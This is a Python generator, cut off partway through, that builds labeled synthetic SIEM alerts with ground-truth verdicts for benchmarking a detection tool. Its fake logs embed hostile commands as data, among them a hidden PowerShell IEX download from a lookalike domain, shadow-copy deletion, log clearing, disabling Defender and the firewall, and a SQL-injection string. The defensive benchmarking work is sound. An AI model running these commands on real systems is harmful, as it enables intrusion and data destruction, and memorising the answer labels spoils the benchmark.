#!/usr/bin/env python3
"""Build a labeled corpus of 200 alerts for ZOVARK accuracy benchmarking.

Distribution:
  55 true_positive   — real attacks across all 11 alert types
  55 false_positive  — benign activity that triggers security rules
  50 suspicious      — ambiguous cases requiring analyst judgment
  40 benign          — clearly normal activity

Each alert includes:
  - Full SIEM event payload (realistic raw_log, IPs, hostnames, usernames)
  - ground_truth_verdict, ground_truth_iocs, ground_truth_risk_range
  - difficulty (easy | medium | hard), notes explaining the verdict
"""
import json
import random
import hashlib
import uuid
from datetime import datetime, timedelta
from pathlib import Path

# ---------------------------------------------------------------------------
# IP / hostname / username pools
# ---------------------------------------------------------------------------
EXTERNAL_MALICIOUS_IPS = [
    "185.220.101.42", "91.215.85.17", "198.51.100.23", "203.0.113.50",
    "45.33.32.156", "192.0.2.77", "198.18.0.99", "185.141.27.10",
    "93.184.216.34", "104.248.50.87", "37.235.1.174", "46.101.250.135",
    "80.82.77.139", "198.51.100.101", "203.0.113.200", "45.55.36.100",
    "178.128.90.11", "159.89.108.55", "167.99.36.112", "206.189.85.18",
]

INTERNAL_IPS = [
    "10.12.5.34", "10.12.8.107", "10.12.3.88", "10.0.1.50",
    "10.0.1.51", "10.0.2.100", "10.0.2.101", "10.0.3.15",
    "10.0.3.16", "10.0.4.20", "10.0.4.21", "10.0.5.30",
    "10.0.5.31", "10.0.6.40", "10.0.6.41", "10.0.7.50",
    "192.168.1.10", "192.168.1.20", "192.168.1.30", "192.168.1.40",
    "192.168.2.10", "192.168.2.20", "192.168.2.30", "192.168.2.40",
    "172.16.0.10", "172.16.0.20", "172.16.0.30", "172.16.0.40",
]

LEGITIMATE_EXTERNAL_IPS = [
    "13.107.42.14",    # Microsoft
    "142.250.80.46",   # Google
    "52.96.108.18",    # Office 365
    "104.16.132.229",  # Cloudflare
    "151.101.1.140",   # Fastly CDN
    "34.107.243.93",   # GCP
    "54.239.28.85",    # AWS
    "20.190.151.131",  # Azure AD
    "17.253.144.10",   # Apple
    "140.82.121.3",    # GitHub
]

MALICIOUS_DOMAINS = [
    "cdn-update.systemcheck.xyz", "a3f2b1c9.ns1.dnsresolv.net",
    "api.microsft-update.com", "login-portal.0ffice365.com",
    "secure.bankofamerica-verify.com", "update.chr0me-browser.net",
    "dl.w1ndows-update.org", "api.dropb0x-sync.com",
    "auth.g00gle-signin.net", "cdn.sl4ck-app.com",
    "portal.az-ure.com", "files.1cloud-drive.net",
]

LEGITIMATE_DOMAINS = [
    "login.microsoftonline.com", "accounts.google.com",
    "github.com", "cdn.cloudflare.com", "update.microsoft.com",
    "api.slack.com", "hooks.slack.com", "smtp.office365.com",
    "ntp.ubuntu.com", "repo.maven.apache.org",
    "registry.npmjs.org", "pypi.org", "rubygems.org",
    "download.docker.com", "releases.hashicorp.com",
]

HOSTNAMES = [
    "web-prod-01", "web-prod-02", "db-master-01", "db-replica-01",
    "app-server-03", "app-server-04", "jump-host-01", "bastion-01",
    "ci-runner-01", "ci-runner-02", "monitoring-01", "elk-01",
    "mail-gw-01", "vpn-gw-01", "dns-01", "dns-02",
    "dc-01", "dc-02", "file-server-01", "backup-srv-01",
    "dev-ws-101", "dev-ws-102", "dev-ws-103", "analyst-ws-01",
    "hr-pc-01", "finance-pc-01", "exec-laptop-01", "kiosk-01",
]

USERNAMES = [
    "admin", "root", "jsmith", "mjohnson", "alee", "kwilliams",
    "svc-backup", "svc-deploy", "svc-monitor", "svc-scanner",
    "dbadmin", "netadmin", "helpdesk", "contractor-01",
    "alice.chen", "bob.kumar", "carol.diaz", "dave.wilson",
    "emma.garcia", "frank.martinez", "grace.taylor", "henry.anderson",
]

SERVICE_ACCOUNTS = [
    "svc-backup", "svc-deploy", "svc-monitor", "svc-scanner",
    "svc-jenkins", "svc-prometheus", "svc-grafana", "svc-nagios",
    "svc-ansible", "svc-terraform", "svc-vault", "svc-consul",
]

# ---------------------------------------------------------------------------
# 11 alert categories (matching ZOVARK skill types)
# ---------------------------------------------------------------------------
ALERT_TYPES = [
    "brute_force", "c2_beacon", "lateral_movement", "phishing",
    "ransomware", "malware", "data_exfiltration", "privilege_escalation",
    "reconnaissance", "persistence", "defense_evasion",
]

MITRE_MAP = {
    "brute_force":          ["T1110", "T1110.001", "T1110.003"],
    "c2_beacon":            ["T1071", "T1071.001", "T1573", "T1105"],
    "lateral_movement":     ["T1021", "T1021.001", "T1021.002", "T1076"],
    "phishing":             ["T1566", "T1566.001", "T1566.002", "T1598"],
    "ransomware":           ["T1486", "T1490", "T1489"],
    "malware":              ["T1059", "T1059.001", "T1204", "T1036"],
    "data_exfiltration":    ["T1041", "T1048", "T1567", "T1020"],
    "privilege_escalation": ["T1068", "T1548", "T1134", "T1078"],
    "reconnaissance":       ["T1046", "T1018", "T1135", "T1016"],
    "persistence":          ["T1053", "T1136", "T1547", "T1098"],
    "defense_evasion":      ["T1070", "T1027", "T1562", "T1112"],
}

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
_counter = {"n": 0}


def _next_id(prefix: str) -> str:
    _counter["n"] += 1
    return f"{prefix}-{_counter['n']:03d}"


def _ts(base_hour: int = 10, jitter_minutes: int = 120) -> str:
    dt = datetime(2026, 3, 15, base_hour, 0, 0) + timedelta(
        minutes=random.randint(0, jitter_minutes),
        seconds=random.randint(0, 59),
    )
    return dt.strftime("%Y-%m-%dT%H:%M:%SZ")


def _pick(lst):
    return random.choice(lst)


def _picks(lst, n=2):
    return random.sample(lst, min(n, len(lst)))


def _pid():
    return random.randint(100, 9999)


def _port():
    return random.randint(1024, 65535)


def _high_port():
    return random.randint(49152, 65535)


def _hash_sha256():
    return hashlib.sha256(uuid.uuid4().bytes).hexdigest()


def _hash_md5():
    return hashlib.md5(uuid.uuid4().bytes).hexdigest()  # noqa: S324


# ---------------------------------------------------------------------------
# TRUE POSITIVE generators (55 alerts, 5 per type = 55)
# ---------------------------------------------------------------------------

def _gen_tp_brute_force(difficulty: str) -> dict:
    src = _pick(EXTERNAL_MALICIOUS_IPS)
    dst = _pick(INTERNAL_IPS)
    host = _pick(HOSTNAMES)
    users = _picks(USERNAMES, 3)
    attempts = random.randint(50, 500) if difficulty != "hard" else random.randint(8, 15)

    lines = []
    for i in range(min(attempts, 20)):
        ts = _ts()
        u = _pick(users)
        lines.append(f"{ts} {host} sshd[{_pid()}]: Failed password for invalid user {u} from {src} port 22")
    if difficulty != "hard":
        lines.append(f"{_ts()} {host} sshd[{_pid()}]: Accepted password for {users[0]} from {src} port 22")

    raw = "\n".join(lines)
    iocs = [src]
    if difficulty == "hard":
        notes = "Low-and-slow brute force: only 8-15 attempts spread over time, single success"
    elif difficulty == "medium":
        notes = "Moderate brute force with credential rotation across multiple usernames"
    else:
        notes = "Classic high-volume SSH brute force from single external IP"

    return _make_alert(
        alert_type="brute_force",
        raw_log=raw,
        prompt=f"Analyze SSH brute force attempts from {src} against {host}",
        src_ip=src, dst_ip=dst, hostname=host,
        verdict="true_positive",
        iocs=iocs,
        mitre=_picks(MITRE_MAP["brute_force"], 2),
        risk_range=[60, 95] if difficulty != "hard" else [35, 70],
        difficulty=difficulty,
        notes=notes,
        severity="high" if difficulty != "hard" else "medium",
    )


def _gen_tp_c2_beacon(difficulty: str) -> dict:
    src = _pick(INTERNAL_IPS)
    c2_ip = _pick(EXTERNAL_MALICIOUS_IPS)
    c2_domain = _pick(MALICIOUS_DOMAINS)
    host = _pick(HOSTNAMES)
    interval = random.choice([30, 60, 120, 300])
    jitter_pct = random.randint(5, 20)

    lines = []
    for i in range(random.randint(10, 30)):
        ts = _ts(jitter_minutes=360)
        if difficulty == "hard":
            # DNS-based C2 with encoded subdomains
            sub = _hash_md5()[:12]
            lines.append(f"{ts} {host} dns[{_pid()}]: query {sub}.{c2_domain} A from {src}")
        else:
            lines.append(
                f"{ts} {host} proxy[{_pid()}]: CONNECT {c2_domain}:443 "
                f"from {src}:{_high_port()} -> {c2_ip}:443 "
                f"bytes_out={random.randint(100, 500)} bytes_in={random.randint(500, 5000)} "
                f"interval={interval}s jitter={jitter_pct}%"
            )

    if difficulty == "easy":
        notes = "Regular HTTP/S beaconing to known-bad domain with fixed interval"
    elif difficulty == "medium":
        notes = "HTTPS beaconing with jitter to typosquatting domain"
    else:
        notes = "DNS tunneling C2 channel with encoded subdomains"

    return _make_alert(
        alert_type="c2_beacon",
        raw_log="\n".join(lines),
        prompt=f"Investigate potential C2 beaconing from {src} to {c2_domain}",
        src_ip=src, dst_ip=c2_ip, hostname=host,
        verdict="true_positive",
        iocs=[src, c2_ip, c2_domain],
        mitre=_picks(MITRE_MAP["c2_beacon"], 2),
        risk_range=[75, 100] if difficulty != "hard" else [50, 85],
        difficulty=difficulty,
        notes=notes,
        severity="critical" if difficulty != "hard" else "high",
    )


def _gen_tp_lateral_movement(difficulty: str) -> dict:
    src = _pick(INTERNAL_IPS)
    targets = _picks(INTERNAL_IPS, random.randint(2, 5))
    targets = [t for t in targets if t != src][:3]
    host = _pick(HOSTNAMES)
    user = _pick(USERNAMES)

    lines = []
    for tgt in targets:
        ts = _ts()
        if difficulty == "hard":
            lines.append(
                f"{ts} {host} wmi[{_pid()}]: WMI remote execution "
                f"user={user} src={src} dst={tgt} "
                f"command='powershell -enc {_hash_md5()[:20]}'"
            )
        else:
            lines.append(
                f"{ts} {host} sshd[{_pid()}]: Accepted publickey for {user} "
                f"from {src} port {_high_port()}"
            )
            lines.append(
                f"{ts} {tgt} sshd[{_pid()}]: session opened for user {user} "
                f"from {src}"
            )

    if difficulty == "easy":
        notes = "SSH hop across multiple internal hosts from single source"
    elif difficulty == "medium":
        notes = "Lateral movement using stolen credentials across 3+ hosts"
    else:
        notes = "WMI-based lateral movement with encoded PowerShell payloads"

    return _make_alert(
        alert_type="lateral_movement",
        raw_log="\n".join(lines),
        prompt=f"Investigate lateral movement from {src} across internal network",
        src_ip=src, dst_ip=targets[0] if targets else src, hostname=host,
        verdict="true_positive",
        iocs=[src] + targets,
        mitre=_picks(MITRE_MAP["lateral_movement"], 2),
        risk_range=[65, 95],
        difficulty=difficulty,
        notes=notes,
        severity="high",
    )


def _gen_tp_phishing(difficulty: str) -> dict:
    src_email = _pick([
        "hr-department@company-benefits.com",
        "support@micros0ft-365.com",
        "noreply@docusign-verify.net",
        "admin@payroll-update.org",
        "security@bank-alert-center.com",
        "it-support@helpdesk-ticket.net",
    ])
    victim = _pick(USERNAMES)
    host = _pick(HOSTNAMES)
    malicious_url = _pick([
        "https://company-benefits.com/update-info",
        "https://micros0ft-365.com/login",
        "https://docusign-verify.net/sign/doc123",
        "https://payroll-update.org/direct-deposit",
        "https://bank-alert-center.com/verify",
    ])
    attachment = _pick([
        "Invoice_Q1_2026.xlsm", "Benefits_Update.docm",
        "PO_34521.pdf.exe", "Resume_JohnDoe.doc",
        "Shipping_Label.html", "Tax_Form_W2.xlsm",
    ])

    if difficulty == "hard":
        # Spear phishing with legitimate-looking content
        lines = [
            f"{_ts()} {host} mail[{_pid()}]: from=<{src_email}> to=<{victim}@company.com> "
            f"subject='Re: Q1 Budget Review - Action Required'",
            f"{_ts()} {host} mail[{_pid()}]: attachment={attachment} size=245760 "
            f"content-type=application/vnd.ms-excel.sheet.macroEnabled.12",
            f"{_ts()} {host} proxy[{_pid()}]: {victim}@company.com clicked {malicious_url}",
            f"{_ts()} {host} endpoint[{_pid()}]: MACRO_EXECUTION file={attachment} "
            f"user={victim} child_process=powershell.exe",
        ]
        notes = "Targeted spear phishing with macro-enabled attachment and callback"
    elif difficulty == "medium":
        lines = [
            f"{_ts()} {host} mail[{_pid()}]: from=<{src_email}> to=<{victim}@company.com> "
            f"subject='Urgent: Password Expiry Notice'",
            f"{_ts()} {host} proxy[{_pid()}]: {victim}@company.com clicked {malicious_url}",
            f"{_ts()} {host} proxy[{_pid()}]: POST {malicious_url} "
            f"content-type=application/x-www-form-urlencoded (credential submission)",
        ]
        notes = "Credential harvesting phishing with fake login portal"
    else:
        lines = [
            f"{_ts()} {host} mail[{_pid()}]: from=<{src_email}> to=<{victim}@company.com> "
            f"subject='You have won a prize!!!'",
            f"{_ts()} {host} mail[{_pid()}]: attachment={attachment} "
            f"x-mailer=PhishKit/2.0",
            f"{_ts()} {host} proxy[{_pid()}]: {victim}@company.com clicked {malicious_url}",
        ]
        notes = "Obvious mass phishing with suspicious sender and attachment"

    return _make_alert(
        alert_type="phishing",
        raw_log="\n".join(lines),
        prompt=f"Analyze phishing email received by {victim}@company.com from {src_email}",
        src_ip=_pick(EXTERNAL_MALICIOUS_IPS), dst_ip=_pick(INTERNAL_IPS),
        hostname=host,
        verdict="true_positive",
        iocs=[src_email, malicious_url],
        mitre=_picks(MITRE_MAP["phishing"], 2),
        risk_range=[55, 90] if difficulty != "easy" else [70, 100],
        difficulty=difficulty,
        notes=notes,
        severity="high",
    )


def _gen_tp_ransomware(difficulty: str) -> dict:
    host = _pick(HOSTNAMES)
    user = _pick(USERNAMES)
    src = _pick(INTERNAL_IPS)
    extensions = [".encrypted", ".locked", ".ZOVARK", ".crypt", ".pay2unlock"]
    ext = _pick(extensions)
    ransom_note = _pick(["README_DECRYPT.txt", "HOW_TO_RECOVER.html", "PAYMENT_INFO.txt"])

    lines = []
    if difficulty == "hard":
        # Slow encryption with legitimate process names
        for i in range(8):
            ts = _ts(jitter_minutes=480)
            fname = _pick(["report", "budget", "data", "backup", "archive"])
            lines.append(
                f"{ts} {host} sysmon[{_pid()}]: FileCreate "
                f"user={user} process=svchost.exe "
                f"file=C:\\Users\\{user}\\Documents\\{fname}_{i}{ext}"
            )
        lines.append(
            f"{_ts()} {host} sysmon[{_pid()}]: FileCreate "
            f"user={user} process=svchost.exe file=C:\\{ransom_note}"
        )
        notes = "Slow-burn ransomware masquerading as svchost.exe, encrypting over hours"
    else:
        for i in range(15):
            ts = _ts()
            fname = f"file_{i:04d}"
            lines.append(
                f"{ts} {host} sysmon[{_pid()}]: FileCreate "
                f"user={user} process=cryptor.exe "
                f"file=C:\\Users\\{user}\\Documents\\{fname}{ext}"
            )
        lines.append(
            f"{_ts()} {host} sysmon[{_pid()}]: FileCreate "
            f"user={user} process=cryptor.exe file=C:\\{ransom_note}"
        )
        lines.append(
            f"{_ts()} {host} sysmon[{_pid()}]: ProcessCreate "
            f"user={user} process=vssadmin.exe "
            f"cmdline='vssadmin delete shadows /all /quiet'"
        )
        notes = "Ransomware with rapid file encryption, ransom note, and shadow copy deletion"

    return _make_alert(
        alert_type="ransomware",
        raw_log="\n".join(lines),
        prompt=f"Investigate potential ransomware activity on {host} by user {user}",
        src_ip=src, dst_ip=src, hostname=host,
        verdict="true_positive",
        iocs=[host, ext, ransom_note] if difficulty == "easy" else [host, ext],
        mitre=_picks(MITRE_MAP["ransomware"], 2),
        risk_range=[80, 100] if difficulty != "hard" else [55, 85],
        difficulty=difficulty,
        notes=notes,
        severity="critical",
    )


def _gen_tp_malware(difficulty: str) -> dict:
    host = _pick(HOSTNAMES)
    user = _pick(USERNAMES)
    src = _pick(INTERNAL_IPS)
    mal_hash = _hash_sha256()
    c2_ip = _pick(EXTERNAL_MALICIOUS_IPS)
    c2_domain = _pick(MALICIOUS_DOMAINS)
    process = _pick(["update_helper.exe", "chrome_updater.exe",
                      "AdobeFlashUpdate.exe", "java_update.exe",
                      "OneDriveSync.exe", "SlackHelper.exe"])

    lines = []
    if difficulty == "hard":
        # Fileless malware via PowerShell
        encoded_cmd = _hash_md5()[:32]
        lines.extend([
            f"{_ts()} {host} sysmon[{_pid()}]: ProcessCreate "
            f"user={user} parent=explorer.exe process=powershell.exe "
            f"cmdline='powershell -w hidden -enc {encoded_cmd}'",
            f"{_ts()} {host} sysmon[{_pid()}]: NetworkConnect "
            f"process=powershell.exe src={src} dst={c2_ip}:443",
            f"{_ts()} {host} sysmon[{_pid()}]: CreateRemoteThread "
            f"source=powershell.exe target=svchost.exe",
        ])
        notes = "Fileless malware: encoded PowerShell downloading payload and injecting into svchost"
    elif difficulty == "medium":
        lines.extend([
            f"{_ts()} {host} sysmon[{_pid()}]: FileCreate "
            f"user={user} file=C:\\Users\\{user}\\AppData\\{process} sha256={mal_hash}",
            f"{_ts()} {host} sysmon[{_pid()}]: ProcessCreate "
            f"user={user} parent=explorer.exe process={process}",
            f"{_ts()} {host} sysmon[{_pid()}]: NetworkConnect "
            f"process={process} src={src} dst={c2_ip}:443",
            f"{_ts()} {host} sysmon[{_pid()}]: RegistryValueSet "
            f"process={process} key=HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
            f"value={process}",
        ])
        notes = "Trojan with persistence via registry run key and C2 callback"
    else:
        lines.extend([
            f"{_ts()} {host} antivirus[{_pid()}]: THREAT_DETECTED "
            f"file=C:\\Users\\{user}\\Downloads\\{process} "
            f"sha256={mal_hash} threat=Trojan.GenericKD.12345",
            f"{_ts()} {host} sysmon[{_pid()}]: ProcessCreate "
            f"user={user} process={process} parent=cmd.exe",
            f"{_ts()} {host} sysmon[{_pid()}]: NetworkConnect "
            f"process={process} src={src} dst={c2_ip}:8080",
        ])
        notes = "Known malware detected by AV with active C2 connection"

    return _make_alert(
        alert_type="malware",
        raw_log="\n".join(lines),
        prompt=f"Investigate malware execution on {host} (hash: {mal_hash[:16]}...)",
        src_ip=src, dst_ip=c2_ip, hostname=host,
        verdict="true_positive",
        iocs=[mal_hash, c2_ip, process] if difficulty != "hard" else [c2_ip, c2_domain],
        mitre=_picks(MITRE_MAP["malware"], 2),
        risk_range=[70, 100] if difficulty != "hard" else [50, 85],
        difficulty=difficulty,
        notes=notes,
        severity="critical" if difficulty == "easy" else "high",
    )


def _gen_tp_data_exfiltration(difficulty: str) -> dict:
    host = _pick(HOSTNAMES)
    user = _pick(USERNAMES)
    src = _pick(INTERNAL_IPS)
    dst = _pick(EXTERNAL_MALICIOUS_IPS)
    dst_domain = _pick(MALICIOUS_DOMAINS)

    lines = []
    if difficulty == "hard":
        # DNS exfiltration (small chunks encoded in queries)
        for i in range(20):
            ts = _ts(jitter_minutes=240)
            chunk = _hash_md5()[:30]
            lines.append(
                f"{ts} {host} dns[{_pid()}]: query "
                f"{chunk}.exfil.{dst_domain} TXT from {src}"
            )
        notes = "DNS-based data exfiltration with encoded payloads in subdomain queries"
    elif difficulty == "medium":
        # HTTPS upload to cloud storage lookalike
        for i in range(5):
            ts = _ts()
            size = random.randint(50_000_000, 500_000_000)
            lines.append(
                f"{ts} {host} proxy[{_pid()}]: PUT https://{dst_domain}/upload/chunk{i} "
                f"from {src} user={user} bytes={size} "
                f"content-type=application/octet-stream"
            )
        notes = "Large data upload to suspicious external domain mimicking cloud storage"
    else:
        # Obvious FTP exfiltration
        total_mb = random.randint(500, 5000)
        lines.extend([
            f"{_ts()} {host} ftp[{_pid()}]: USER {user} from {src}",
            f"{_ts()} {host} ftp[{_pid()}]: STOR /uploads/company_data.tar.gz "
            f"from {src} to {dst} size={total_mb}MB",
            f"{_ts()} {host} dlp[{_pid()}]: ALERT large_upload "
            f"user={user} destination={dst} size={total_mb}MB "
            f"classification=CONFIDENTIAL",
        ])
        notes = "Large FTP upload of confidential data to external server flagged by DLP"

    return _make_alert(
        alert_type="data_exfiltration",
        raw_log="\n".join(lines),
        prompt=f"Investigate potential data exfiltration from {src} to {dst_domain}",
        src_ip=src, dst_ip=dst, hostname=host,
        verdict="true_positive",
        iocs=[src, dst, dst_domain] if difficulty != "hard" else [src, dst_domain],
        mitre=_picks(MITRE_MAP["data_exfiltration"], 2),
        risk_range=[70, 100] if difficulty == "easy" else [50, 90],
        difficulty=difficulty,
        notes=notes,
        severity="critical" if difficulty == "easy" else "high",
    )


def _gen_tp_privilege_escalation(difficulty: str) -> dict:
    host = _pick(HOSTNAMES)
    user = _pick(USERNAMES)
    src = _pick(INTERNAL_IPS)

    lines = []
    if difficulty == "hard":
        # Token manipulation
        lines.extend([
            f"{_ts()} {host} sysmon[{_pid()}]: ProcessCreate "
            f"user={user} process=whoami.exe cmdline='whoami /priv'",
            f"{_ts()} {host} security[{_pid()}]: 4672 Special privileges assigned "
            f"to new logon. Subject: {user} Privileges: SeDebugPrivilege",
            f"{_ts()} {host} sysmon[{_pid()}]: ProcessAccess "
            f"source={user}\\cmd.exe target=lsass.exe "
            f"access=PROCESS_QUERY_INFORMATION",
        ])
        notes = "Token manipulation: SeDebugPrivilege escalation followed by lsass access"
    elif difficulty == "medium":
        # sudo/su escalation on Linux
        lines.extend([
            f"{_ts()} {host} sudo[{_pid()}]: {user} : TTY=pts/0 ; "
            f"PWD=/home/{user} ; USER=root ; "
            f"COMMAND=/bin/bash",
            f"{_ts()} {host} sshd[{_pid()}]: session opened for user root by {user}",
            f"{_ts()} {host} audit[{_pid()}]: EXECVE "
            f"user=root cmd='chmod 4755 /tmp/backdoor'",
        ])
        notes = "Sudo escalation to root followed by SUID backdoor creation"
    else:
        lines.extend([
            f"{_ts()} {host} security[{_pid()}]: 4728 A member was added to "
            f"security-enabled global group 'Domain Admins'. "
            f"Subject: {user} MemberSid: S-1-5-21-...",
            f"{_ts()} {host} security[{_pid()}]: 4672 Special privileges assigned "
            f"to new logon. Subject: {user}",
        ])
        notes = "User added to Domain Admins group — clear privilege escalation"

    return _make_alert(
        alert_type="privilege_escalation",
        raw_log="\n".join(lines),
        prompt=f"Investigate privilege escalation by {user} on {host}",
        src_ip=src, dst_ip=src, hostname=host,
        verdict="true_positive",
        iocs=[user, host],
        mitre=_picks(MITRE_MAP["privilege_escalation"], 2),
        risk_range=[65, 100] if difficulty != "hard" else [45, 80],
        difficulty=difficulty,
        notes=notes,
        severity="critical" if difficulty == "easy" else "high",
    )


def _gen_tp_reconnaissance(difficulty: str) -> dict:
    src = _pick(EXTERNAL_MALICIOUS_IPS)
    targets = _picks(INTERNAL_IPS, 5)
    host = _pick(HOSTNAMES)
    ports = random.sample(range(1, 1024), random.randint(10, 50))

    lines = []
    if difficulty == "hard":
        # Slow port scan (1 port every few minutes)
        for p in ports[:8]:
            ts = _ts(jitter_minutes=480)
            tgt = _pick(targets)
            lines.append(
                f"{ts} {host} firewall[{_pid()}]: DROP "
                f"src={src} dst={tgt} proto=TCP dport={p} flags=SYN"
            )
        notes = "Slow reconnaissance: 8 ports scanned over 8 hours to evade detection"
    elif difficulty == "medium":
        for tgt in targets:
            for p in random.sample(ports, 5):
                ts = _ts()
                lines.append(
                    f"{ts} {host} firewall[{_pid()}]: DROP "
                    f"src={src} dst={tgt} proto=TCP dport={p} flags=SYN"
                )
        notes = "Port scan across multiple internal hosts from single external source"
    else:
        for tgt in targets:
            for p in ports[:10]:
                ts = _ts()
                lines.append(
                    f"{ts} {host} firewall[{_pid()}]: DROP "
                    f"src={src} dst={tgt} proto=TCP dport={p} flags=SYN"
                )
        notes = "Aggressive full port scan from external IP — high volume, easy to detect"

    return _make_alert(
        alert_type="reconnaissance",
        raw_log="\n".join(lines),
        prompt=f"Analyze port scan activity from {src}",
        src_ip=src, dst_ip=targets[0], hostname=host,
        verdict="true_positive",
        iocs=[src],
        mitre=_picks(MITRE_MAP["reconnaissance"], 2),
        risk_range=[40, 75] if difficulty != "easy" else [50, 85],
        difficulty=difficulty,
        notes=notes,
        severity="medium" if difficulty == "hard" else "high",
    )


def _gen_tp_persistence(difficulty: str) -> dict:
    host = _pick(HOSTNAMES)
    user = _pick(USERNAMES)
    src = _pick(INTERNAL_IPS)

    lines = []
    if difficulty == "hard":
        # WMI event subscription persistence
        lines.extend([
            f"{_ts()} {host} sysmon[{_pid()}]: WmiEventConsumerToFilter "
            f"user={user} consumer='CommandLineEventConsumer' "
            f"filter='__EventFilter' "
            f"command='powershell -w hidden -c IEX(wget http://{_pick(MALICIOUS_DOMAINS)}/s)'",
        ])
        notes = "WMI event subscription persistence — executes on every boot"
    elif difficulty == "medium":
        # Cron job / scheduled task
        lines.extend([
            f"{_ts()} {host} sysmon[{_pid()}]: ProcessCreate "
            f"user={user} process=schtasks.exe "
            f"cmdline='schtasks /create /tn \"WindowsUpdate\" /tr "
            f"\"C:\\Users\\{user}\\AppData\\update.exe\" /sc onlogon /rl highest'",
            f"{_ts()} {host} sysmon[{_pid()}]: FileCreate "
            f"user={user} file=C:\\Users\\{user}\\AppData\\update.exe "
            f"sha256={_hash_sha256()}",
        ])
        notes = "Scheduled task persistence masquerading as Windows Update"
    else:
        lines.extend([
            f"{_ts()} {host} sysmon[{_pid()}]: RegistryValueSet "
            f"user={user} process=malware.exe "
            f"key=HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
            f"name=Updater value=C:\\Users\\{user}\\malware.exe",
            f"{_ts()} {host} security[{_pid()}]: 4698 A scheduled task was created. "
            f"TaskName: \\MalwareTask Creator: {user}",
        ])
        notes = "Registry Run key and scheduled task persistence — obvious malware"

    return _make_alert(
        alert_type="persistence",
        raw_log="\n".join(lines),
        prompt=f"Investigate persistence mechanisms installed by {user} on {host}",
        src_ip=src, dst_ip=src, hostname=host,
        verdict="true_positive",
        iocs=[user, host],
        mitre=_picks(MITRE_MAP["persistence"], 2),
        risk_range=[60, 95] if difficulty != "hard" else [40, 75],
        difficulty=difficulty,
        notes=notes,
        severity="high",
    )


def _gen_tp_defense_evasion(difficulty: str) -> dict:
    host = _pick(HOSTNAMES)
    user = _pick(USERNAMES)
    src = _pick(INTERNAL_IPS)

    lines = []
    if difficulty == "hard":
        # Timestomping + log clearing
        lines.extend([
            f"{_ts()} {host} sysmon[{_pid()}]: FileCreationTimeChanged "
            f"user={user} process=attacker.exe "
            f"file=C:\\Windows\\System32\\backdoor.dll "
            f"previous=2026-03-15T14:30:00Z new=2024-06-15T08:00:00Z",
            f"{_ts()} {host} security[{_pid()}]: 1102 The audit log was cleared. "
            f"Subject: {user}",
        ])
        notes = "Defense evasion: timestomping a planted DLL and clearing audit logs"
    elif difficulty == "medium":
        lines.extend([
            f"{_ts()} {host} sysmon[{_pid()}]: ProcessCreate "
            f"user={user} process=cmd.exe "
            f"cmdline='wevtutil cl Security'",
            f"{_ts()} {host} sysmon[{_pid()}]: ProcessCreate "
            f"user={user} process=cmd.exe "
            f"cmdline='wevtutil cl System'",
            f"{_ts()} {host} sysmon[{_pid()}]: ProcessCreate "
            f"user={user} process=attrib.exe "
            f"cmdline='attrib +h +s C:\\Users\\{user}\\payload.exe'",
        ])
        notes = "Event log clearing and file hiding via attrib"
    else:
        lines.extend([
            f"{_ts()} {host} sysmon[{_pid()}]: ProcessCreate "
            f"user={user} process=cmd.exe "
            f"cmdline='netsh advfirewall set allprofiles state off'",
            f"{_ts()} {host} sysmon[{_pid()}]: ProcessCreate "
            f"user={user} process=sc.exe "
            f"cmdline='sc stop WinDefend'",
            f"{_ts()} {host} sysmon[{_pid()}]: RegistryValueSet "
            f"process=reg.exe "
            f"key=HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender "
            f"name=DisableAntiSpyware value=1",
        ])
        notes = "Firewall disabled, Windows Defender stopped — obvious defense evasion"

    return _make_alert(
        alert_type="defense_evasion",
        raw_log="\n".join(lines),
        prompt=f"Investigate defense evasion techniques used by {user} on {host}",
        src_ip=src, dst_ip=src, hostname=host,
        verdict="true_positive",
        iocs=[user, host],
        mitre=_picks(MITRE_MAP["defense_evasion"], 2),
        risk_range=[60, 95] if difficulty != "hard" else [40, 80],
        difficulty=difficulty,
        notes=notes,
        severity="high",
    )


# ---------------------------------------------------------------------------
# FALSE POSITIVE generators (55 alerts — tricky benign activity)
# ---------------------------------------------------------------------------

FP_TEMPLATES = [
    # 1. Developer SSH tunnel (looks like lateral movement)
    lambda: _make_alert(
        alert_type="lateral_movement",
        raw_log=(
            f"{_ts()} dev-ws-101 sshd[{_pid()}]: Accepted publickey for alice.chen "
            f"from 10.0.1.50 port {_high_port()}\n"
            f"{_ts()} dev-ws-101 sshd[{_pid()}]: tunnel: TCP forwarding "
            f"src=127.0.0.1:{_pick([3306, 5432, 6379])} -> db-master-01:{_pick([3306, 5432, 6379])}\n"
            f"{_ts()} dev-ws-101 sshd[{_pid()}]: session: alice.chen duration=7200s "
            f"bytes_transferred=45678"
        ),
        prompt="Investigate SSH lateral movement from dev workstation to database server",
        src_ip="10.0.1.50", dst_ip="10.0.2.100", hostname="dev-ws-101",
        verdict="false_positive",
        iocs=[],
        mitre=[],
        risk_range=[5, 25],
        difficulty="hard",
        notes="Developer using authorized SSH tunnel to database for debugging — normal workflow",
        severity="low",
    ),
    # 2. Marketing bulk email (looks like data exfiltration)
    lambda: _make_alert(
        alert_type="data_exfiltration",
        raw_log=(
            f"{_ts()} mail-gw-01 postfix[{_pid()}]: "
            f"from=<marketing@company.com> to=<newsletter-list@mailchimp.com> "
            f"size=15728640 nrcpt=2500 status=sent\n"
            f"{_ts()} mail-gw-01 dlp[{_pid()}]: WARN large_outbound_email "
            f"user=emma.garcia size=15MB recipients=2500 "
            f"destination=mailchimp.com\n"
            f"{_ts()} mail-gw-01 proxy[{_pid()}]: POST https://api.mailchimp.com/3.0/campaigns "
            f"from=10.0.6.40 bytes=16777216"
        ),
        prompt="Investigate large data transfer from marketing to external email service",
        src_ip="10.0.6.40", dst_ip="104.16.132.229", hostname="mail-gw-01",
        verdict="false_positive",
        iocs=[],
        mitre=[],
        risk_range=[5, 20],
        difficulty="hard",
        notes="Marketing team sending legitimate newsletter via Mailchimp — approved business process",
        severity="low",
    ),
    # 3. Penetration test traffic (looks like real attack)
    lambda: _make_alert(
        alert_type="reconnaissance",
        raw_log=(
            f"{_ts()} firewall[{_pid()}]: IDS_ALERT "
            f"src=10.0.7.50 dst=10.0.2.100 "
            f"signature='ET SCAN Nmap Scripting Engine' severity=HIGH\n"
            f"{_ts()} web-prod-01 modsecurity[{_pid()}]: ALERT "
            f"src=10.0.7.50 uri=/admin' OR 1=1-- "
